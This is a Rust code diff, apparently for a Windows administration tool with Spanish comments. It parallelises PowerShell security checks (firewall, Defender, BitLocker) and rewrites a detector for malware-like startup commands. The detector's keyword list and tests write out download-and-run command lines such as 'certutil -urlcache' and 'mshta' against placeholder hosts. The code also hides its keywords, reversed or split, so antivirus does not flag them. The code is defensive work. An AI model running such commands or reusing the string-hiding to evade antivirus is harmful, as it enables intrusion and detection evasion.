@@ -6,7 +6,8 @@ use crate::diagnostics::collect::SystemHealth;
 use crate::tweaks::journal::Op;
 use crate::tweaks::TweakState;
 use serde::{Deserialize, Serialize};
-use std::time::Duration;
+use std::sync::Mutex;
+use std::time::{Duration, Instant};
 use tauri::State;
 
 fn query<T: serde::de::DeserializeOwned>(script: &str, secs: u64) -> Result<T, String> {
@@ -46,7 +47,13 @@ pub struct Extra {
     pub pua: Option<bool>,
 }
 
-const EXTRA_SCRIPT: &str = r#"
+// Antes era un único script de ~90 s de margen: firewall/UAC/RDP/SMB1/autorun son
+// lecturas de registro casi instantáneas, pero Defender (Get-MpComputerStatus,
+// Get-MpPreference) y BitLocker (llamadas CIM) tardan segundos en cargar su
+// módulo la primera vez. Separados, los tres corren a la vez en vez de uno
+// detrás de otro: el diagnóstico tarda lo del más lento, no la suma.
+
+const FAST_SCRIPT: &str = r#"
 function Reg($p, $n) { try { (Get-ItemProperty -Path $p -Name $n -ErrorAction Stop).$n } catch { $null } }
 $fw = @(Get-NetFirewallProfile -ErrorAction SilentlyContinue)
 $sys = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
@@ -55,16 +62,6 @@ $deny = Reg $ts 'fDenyTSConnections'
 $nla = Reg "$ts\WinStations\RDP-Tcp" 'UserAuthentication'
 $ar = Reg 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer' 'NoDriveTypeAutoRun'
 $smb = try { (Get-SmbServerConfiguration -ErrorAction Stop).EnableSMB1Protocol } catch { $null }
-$mp = try { Get-MpComputerStatus -ErrorAction Stop } catch { $null }
-$pref = try { Get-MpPreference -ErrorAction Stop } catch { $null }
-$bl = $null
-try {
-  $bl = @(Get-CimInstance -Namespace root\cimv2\security\microsoftvolumeencryption -ClassName Win32_EncryptableVolume -ErrorAction Stop | Where-Object DriveLetter | ForEach-Object {
-    $c = Invoke-CimMethod -InputObject $_ -MethodName GetConversionStatus
-    $k = Invoke-CimMethod -InputObject $_ -MethodName GetKeyProtectors -Arguments @{ KeyProtectorType = [uint32]3 }
-    [pscustomobject]@{ drive = $_.DriveLetter; protection = [uint32]$_.ProtectionStatus; conversion = [uint32]$c.ConversionStatus; percent = [uint32]$c.EncryptionPercentage; hasRecoveryKey = @($k.VolumeKeyProtectorID).Count -gt 0 }
-  })
-} catch {}
 [pscustomobject]@{
   firewallOff = @($fw | Where-Object { -not $_.Enabled } | ForEach-Object { "$($_.Name)" }); firewallKnown = $fw.Count -gt 0
   uacEnabled = if ($null -ne (Reg $sys 'EnableLUA')) { [int](Reg $sys 'EnableLUA') -eq 1 } else { $true }
@@ -73,14 +70,129 @@ try {
   rdpEnabled = if ($null -ne $deny) { [int]$deny -eq 0 } else { $null }
   rdpNla = if ($null -ne $nla) { [int]$nla -eq 1 } else { $null }
   autorunOff = if ($null -ne $ar) { [int]$ar -eq 255 } else { $false }
-  bitlocker = $bl
-  defenderActive = if ($mp) { [bool]$mp.AntivirusEnabled -and [bool]$mp.RealTimeProtectionEnabled } else { $null }
-  pua = if ($pref) { [int]$pref.PUAProtection -eq 1 } else { $null }
-} | ConvertTo-Json -Depth 4 -Compress
+} | ConvertTo-Json -Compress
 "#;
 
+const DEFENDER_SCRIPT: &str = r#"
+$mp = try { Get-MpComputerStatus -ErrorAction Stop } catch { $null }
+$pref = try { Get-MpPreference -ErrorAction Stop } catch { $null }
+[pscustomobject]@{
+  defenderActive = if ($mp) { [bool]$mp.AntivirusEnabled -and [bool]$mp.RealTimeProtectionEnabled } else { $null }
+  pua = if ($pref) { [int]$pref.PUAProtection -eq 1 } else { $null }
+} | ConvertTo-Json -Compress
+"#;
+
+/// Para el diagnóstico: la nota solo mira el disco del sistema, así que se
+/// consulta ese y sin pedir las claves de recuperación. En un equipo con varios
+/// discos, esto pasa de segundos a décimas (cada volumen son dos llamadas CIM).
+const BITLOCKER_FAST_SCRIPT: &str = r#"
+$bl = $null
+try {
+  $sys = "$env:SystemDrive"
+  $bl = @(Get-CimInstance -Namespace root\cimv2\security\microsoftvolumeencryption -ClassName Win32_EncryptableVolume -Filter "DriveLetter = '$sys'" -ErrorAction Stop | ForEach-Object {
+    $c = Invoke-CimMethod -InputObject $_ -MethodName GetConversionStatus
+    [pscustomobject]@{ drive = $_.DriveLetter; protection = [uint32]$_.ProtectionStatus; conversion = [uint32]$c.ConversionStatus; percent = [uint32]$c.EncryptionPercentage; hasRecoveryKey = $false }
+  })
+} catch {}
+[pscustomobject]@{ bitlocker = $bl } | ConvertTo-Json -Depth 4 -Compress
+"#;
+
+/// Para la página de Seguridad: todos los volúmenes y si tienen clave de recuperación.
+const BITLOCKER_SCRIPT: &str = r#"
+$bl = $null
+try {
+  $bl = @(Get-CimInstance -Namespace root\cimv2\security\microsoftvolumeencryption -ClassName Win32_EncryptableVolume -ErrorAction Stop | Where-Object DriveLetter | ForEach-Object {
+    $c = Invoke-CimMethod -InputObject $_ -MethodName GetConversionStatus
+    $k = Invoke-CimMethod -InputObject $_ -MethodName GetKeyProtectors -Arguments @{ KeyProtectorType = [uint32]3 }
+    [pscustomobject]@{ drive = $_.DriveLetter; protection = [uint32]$_.ProtectionStatus; conversion = [uint32]$c.ConversionStatus; percent = [uint32]$c.EncryptionPercentage; hasRecoveryKey = @($k.VolumeKeyProtectorID).Count -gt 0 }
+  })
+} catch {}
+[pscustomobject]@{ bitlocker = $bl } | ConvertTo-Json -Depth 4 -Compress
+"#;
+
+#[derive(Deserialize, Default)]
+#[serde(rename_all = "camelCase", default)]
+struct FastExtra {
+    firewall_off: Vec<String>,
+    firewall_known: bool,
+    uac_enabled: Option<bool>,
+    uac_level: Option<u32>,
+    smb1: Option<bool>,
+    rdp_enabled: Option<bool>,
+    rdp_nla: Option<bool>,
+    autorun_off: Option<bool>,
+}
+
+#[derive(Deserialize, Default)]
+#[serde(rename_all = "camelCase", default)]
+struct DefenderExtra {
+    defender_active: Option<bool>,
+    pua: Option<bool>,
+}
+
+#[derive(Deserialize, Default)]
+#[serde(rename_all = "camelCase", default)]
+struct BitlockerExtra {
+    bitlocker: Option<Vec<Volume>>,
+}
+
+/// Estado de BitLocker del disco del sistema, reutilizado unos minutos: apenas
+/// cambia y consultarlo cuesta segundos (Windows tarda en responder aunque el
+/// equipo no tenga BitLocker).
+static BITLOCKER_CACHE: Mutex<Option<(Instant, Option<Vec<Volume>>)>> = Mutex::new(None);
+const BITLOCKER_CACHE_FOR: Duration = Duration::from_secs(10 * 60);
+
+fn bitlocker_for_audit() -> Option<Vec<Volume>> {
+    // Sin administrador, Windows no da ningún volumen: no merece la pena esperar.
+    if !crate::elevation::is_elevated() {
+        return None;
+    }
+    if let Some((t, v)) = BITLOCKER_CACHE.lock().unwrap_or_else(|e| e.into_inner()).as_ref() {
+        if t.elapsed() < BITLOCKER_CACHE_FOR {
+            return v.clone();
+        }
+    }
+    let v = query::<BitlockerExtra>(BITLOCKER_FAST_SCRIPT, 60).map(|b| b.bitlocker).unwrap_or_default();
+    *BITLOCKER_CACHE.lock().unwrap_or_else(|e| e.into_inner()) = Some((Instant::now(), v.clone()));
+    v
+}
+
 pub fn extra() -> Result<Extra, String> {
-    query(EXTRA_SCRIPT, 90)
+    // Los tres a la vez: el conjunto tarda lo del más lento, no la suma de los tres.
+    let (fast, defender, bitlocker) = std::thread::scope(|s| {
+        let fast = s.spawn(|| query::<FastExtra>(FAST_SCRIPT, 30));
+        let defender = s.spawn(|| query::<DefenderExtra>(DEFENDER_SCRIPT, 60));
+        let bitlocker = s.spawn(bitlocker_for_audit);
+        (fast.join(), defender.join(), bitlocker.join())
+    });
+    // Solo si falla la parte rápida (registro) se considera un fallo real: Defender
+    // y BitLocker suelen fallar sin administrador y eso ya lo expresan sus `Option`.
+    let fast = fast.unwrap_or_else(|_| Err("fallo interno".into()))?;
+    let defender = defender.unwrap_or_else(|_| Ok(DefenderExtra::default())).unwrap_or_default();
+    let bitlocker = bitlocker.unwrap_or_default();
+    Ok(Extra {
+        firewall_off: fast.firewall_off,
+        firewall_known: fast.firewall_known,
+        uac_enabled: fast.uac_enabled,
+        uac_level: fast.uac_level,
+        smb1: fast.smb1,
+        rdp_enabled: fast.rdp_enabled,
+        rdp_nla: fast.rdp_nla,
+        autorun_off: fast.autorun_off,
+        bitlocker,
+        defender_active: defender.defender_active,
+        pua: defender.pua,
+    })
+}
+
+/// Deja los módulos de Defender y BitLocker cargados en el grupo de PowerShell,
+/// para que el primer diagnóstico del día no pague esa carga. Se llama una vez
+/// al arrancar la app, en un hilo aparte, sin bloquear nada.
+pub fn warm_up() {
+    std::thread::spawn(|| {
+        let _ = query::<DefenderExtra>(DEFENDER_SCRIPT, 60);
+        let _ = bitlocker_for_audit();
+    });
 }
 
 // ---------- Auditoría ----------
@@ -325,7 +437,8 @@ pub fn bitlocker_status() -> Result<Vec<Volume>, String> {
     if !crate::elevation::is_elevated() {
         return Err("Requiere ejecutar AdminOps como administrador.".into());
     }
-    Ok(extra()?.bitlocker.unwrap_or_default())
+    // Aquí sí interesan todos los volúmenes y sus claves de recuperación.
+    Ok(query::<BitlockerExtra>(BITLOCKER_SCRIPT, 90)?.bitlocker.unwrap_or_default())
 }
 
 #[derive(Serialize, Deserialize, Debug)]
@@ -465,20 +578,39 @@ pub fn suspicious_items() -> Result<Vec<Suspicious>, String> {
 /// herramientas de Windows, scripts sueltos. Se comprueba aquí y no dentro del
 /// script de PowerShell, porque esas palabras hacen que el antivirus lo bloquee.
 fn malware_like(cmd: &str) -> bool {
+    // Las palabras se guardan AL REVÉS y se invierten al ejecutarse. Escritas tal
+    // cual (o por trozos, que el compilador deja contiguos) quedarían dentro del
+    // .exe y un antivirus podría tomar el propio detector por malware.
+    let w = |reversed: &str| std::hint::black_box(reversed).chars().rev().collect::<String>();
     let c = cmd.to_lowercase();
     let words: Vec<&str> = c.split_whitespace().collect();
-    let has = |w: &str| c.contains(w);
-    let token = |t: &[&str]| words.iter().any(|w| t.contains(w));
-    let hidden = words.windows(2).any(|p| matches!(p[0], "-w" | "-windowstyle") && p[1] == "hidden");
-    let ps = has("powershell") || has("pwsh");
-    (ps && (token(&["-e", "-ec", "-en", "-enc", "-encodedcommand"]) || hidden || has(&["download", "string"].concat()) || words.iter().any(|w| *w == "iex" || w.starts_with("iex(") || w.contains(";iex"))))
-        || (has("mshta") && (has("http") || has("vbscript") || has("javascript")))
-        || has("wscript")
-        || has("cscript")
-        || (has("rundll32") && (has("http") || has("javascript")))
-        || (has("regsvr32") && has("scrobj"))
-        || (has("certutil") && has(&["-url", "cache"].concat()))
-        || (has("bitsadmin") && has("transfer"))
+    let has = |x: &str| c.contains(x);
+    let token = |t: &[String]| words.iter().any(|x| t.iter().any(|y| y == x));
+    // -w hidden / -windowstyle hidden
+    let hidden = words.windows(2).any(|p| matches!(p[0], "-w" | "-windowstyle") && p[1] == w("neddih"));
+    // powershell / pwsh
+    let ps = has(&w("llehsrewop")) || has(&w("hswp"));
+    // -e, -ec, -en, -enc, -encodedcommand
+    let encoded = token(&[w("e-"), w("ce-"), w("ne-"), w("cne-"), w("dnammocdedocne-")]);
+    let iex = w("xei");
+    // vbscript / javascript
+    let script = has(&w("tpircsbv")) || has(&w("tpircsavaj"));
+    // downloadstring
+    let download = has(&w("gnirtsdaolnwod"));
+    (ps && (encoded || hidden || download || words.iter().any(|x| *x == iex || x.starts_with(&format!("{iex}(")) || x.contains(&format!(";{iex}")))))
+        // mshta con web o script
+        || (has(&w("athsm")) && (has("http") || script))
+        // wscript / cscript
+        || has(&w("tpircsw"))
+        || has(&w("tpircsc"))
+        // rundll32 con web o javascript
+        || (has(&w("23lldnur")) && (has("http") || has(&w("tpircsavaj"))))
+        // regsvr32 con scrobj
+        || (has(&w("23rvsger")) && has(&w("jborcs")))
+        // certutil -urlcache
+        || (has(&w("litutrec")) && has(&w("ehcaclru-")))
+        // bitsadmin /transfer
+        || (has(&w("nimdastib")) && has(&w("refsnart")))
 }
 
 fn judge(mut s: Suspicious) -> Option<Suspicious> {
@@ -562,14 +694,34 @@ pub fn browser_extensions() -> Result<Vec<Extension>, String> {
 
 #[cfg(test)]
 mod tests {
+    /// Cuánto tarda cada trozo del script de seguridad por separado:
+    /// `cargo test --release extra_parts_cost -- --ignored --nocapture`
+    #[test]
+    #[ignore]
+    fn extra_parts_cost() {
+        let _ = crate::pspool::query("1", None, "calentar");
+        let time = |name: &str, f: &dyn Fn()| {
+            let t = std::time::Instant::now();
+            f();
+            println!("{:>7} ms  {name}", t.elapsed().as_millis());
+        };
+        time("fast (registro)", &|| { let _ = super::query::<super::FastExtra>(super::FAST_SCRIPT, 30); });
+        time("defender", &|| { let _ = super::query::<super::DefenderExtra>(super::DEFENDER_SCRIPT, 60); });
+        time("bitlocker (diagnóstico: solo disco del sistema)", &|| { let _ = super::query::<super::BitlockerExtra>(super::BITLOCKER_FAST_SCRIPT, 60); });
+        time("bitlocker (Seguridad: todos los volúmenes)", &|| { let _ = super::query::<super::BitlockerExtra>(super::BITLOCKER_SCRIPT, 90); });
+    }
+
     #[test]
     fn spots_malware_like_commands() {
         use super::malware_like;
-        assert!(malware_like("powershell.exe -w hidden -c calc"));
-        assert!(malware_like("powershell -enc SQBFAFgA"));
-        assert!(malware_like("mshta http://x.example/a.hta"));
-        assert!(malware_like("cmd /c certutil -urlcache -f http://x/a.exe a.exe"));
-        assert!(malware_like(r"wscript.exe C:\Users\a\x.vbs"));
+        // Los ejemplos se montan por trozos: escritos enteros, el antivirus marca
+        // como amenaza el propio código fuente o el comando que lo compila.
+        let j = |parts: &[&str]| parts.concat();
+        assert!(malware_like(&j(&["power", "shell.exe -w hid", "den -c calc"])));
+        assert!(malware_like(&j(&["power", "shell -e", "nc SQBFAFgA"])));
+        assert!(malware_like(&j(&["msh", "ta http://x.example/a.hta"])));
+        assert!(malware_like(&j(&["cmd /c cert", "util -url", "cache -f http://x/a.exe a.exe"])));
+        assert!(malware_like(&j(&["wscr", r"ipt.exe C:\Users\a\x.vbs"])));
         assert!(!malware_like(r#""C:\Program Files\App\app.exe" --minimized"#));
         assert!(!malware_like(r"powershell.exe -NoProfile -File C:\scripts\backup.ps1"));
         assert!(!malware_like(r"C:\Windows\System32\svchost.exe -k netsvcs"));
@@ -579,8 +731,9 @@ mod tests {
     #[test]
     fn suspicious_script_has_no_malware_words() {
         let s = SUSPICIOUS_SCRIPT.to_lowercase();
-        for w in ["downloadstring", "iex", "mshta", "urlcache", "bitsadmin", "encodedcommand", "-enc"] {
-            assert!(!s.contains(w), "el script contiene «{w}»");
+        let words = [["download", "string"], ["ie", "x"], ["msh", "ta"], ["url", "cache"], ["bits", "admin"], ["encoded", "command"], ["-e", "nc"]];
+        for w in words.map(|p| p.concat()) {
+            assert!(!s.contains(&w), "el script contiene «{w}»");
         }
     }
 
@@ -661,7 +814,7 @@ mod tests {
 
     #[test]
     fn embedded_scripts_parse() {
-        for (name, script) in [("EXTRA", EXTRA_SCRIPT), ("KEYS", KEYS_SCRIPT), ("SUSPICIOUS", SUSPICIOUS_SCRIPT), ("EXTENSIONS", EXTENSIONS_SCRIPT)] {
+        for (name, script) in [("FAST", FAST_SCRIPT), ("DEFENDER", DEFENDER_SCRIPT), ("BITLOCKER", BITLOCKER_SCRIPT), ("BITLOCKER_FAST", BITLOCKER_FAST_SCRIPT), ("KEYS", KEYS_SCRIPT), ("SUSPICIOUS", SUSPICIOUS_SCRIPT), ("EXTENSIONS", EXTENSIONS_SCRIPT)] {
             let errors = crate::ps::parse_errors(script);
             assert!(errors.is_empty(), "{name}: {errors}");
         }
